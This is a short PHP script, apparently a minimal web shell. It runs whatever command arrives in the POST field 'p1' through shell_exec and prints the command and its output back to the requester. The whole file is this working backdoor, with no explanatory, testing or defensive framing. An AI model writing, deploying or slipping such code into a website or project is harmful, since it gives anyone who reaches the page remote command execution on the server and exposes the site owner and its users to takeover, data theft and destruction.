<?php
function ex($in) {
	$out = '';
	$out = shell_exec($in);
	return $out;
}

echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
?>